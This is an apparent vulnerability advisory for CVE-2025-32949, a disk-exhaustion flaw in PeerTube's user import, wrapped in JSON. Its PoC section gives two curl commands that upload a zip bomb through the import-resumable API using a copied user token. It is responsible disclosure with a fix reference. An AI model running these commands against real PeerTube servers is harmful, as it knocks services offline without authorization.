{"hash":"49d4953e5d7df04bcf3345db72ab5912d1ab1708","data":{"post":{"title":"PeerTube User Import Authenticated Resource Exhaustion","path":"/vulnerabilities/peertube-archive-resource-exhaustion/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>This vulnerability allows any authenticated user to cause the server to consume very large amounts of disk space when extracting a Zip Bomb</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://github.com/Chocobozzz/PeerTube\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PeerTube</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(, 7.1.0]</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.\nThe yauzl library does not contain any mechanism to detect or prevent extraction of a <a href=\"https://en.wikipedia.org/wiki/Zip_bomb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Zip Bomb</a>. Therefore, when using the User Import functionality with a Zip Bomb, PeerTube will try extracting the archive which will cause a disk space resource exhaustion.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.</p>\n<ol>\n<li>First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.</li>\n<li>Create a Zip Bomb named <code>evil.zip</code> in the current directory</li>\n<li>In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):</li>\n</ol>\n<pre><code>new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{\"name\":\"evil.zip\",\"mimeType\":\"application/x-zip-compressed\",\"size\":168,\"lastModified\":1743493990068,\"filename\":\"evil.zip\"}' | awk '/^location:/{print $2}' | tr -d '\\r')\ncurl -X PUT \"$new_location\" -H \"Content-Type: application/octet-stream\" -H \"Content-Range: bytes 0-167/168\" -H 'Authorization: user_token' --data-binary @evil.zip\n</code></pre>\n<p>If everything was done correctly, the PeerTube server will begin extracting the zip file, which will cause disk space resource exhaustion.</p>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix release</a></p>\n<p><a href=\"https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PoC Materials</a></p>\n","description":"CVE-2025-32949 Medium severity. PeerTube User Import Authenticated Resource Exhaustion","date_published":"2025-04-14","xray_id":"","vul_id":"CVE-2025-32949","severity":"medium","discovered_by":"Ori Hollander","last_updated":"2025-04-14","cvss":6.5}},"context":{}}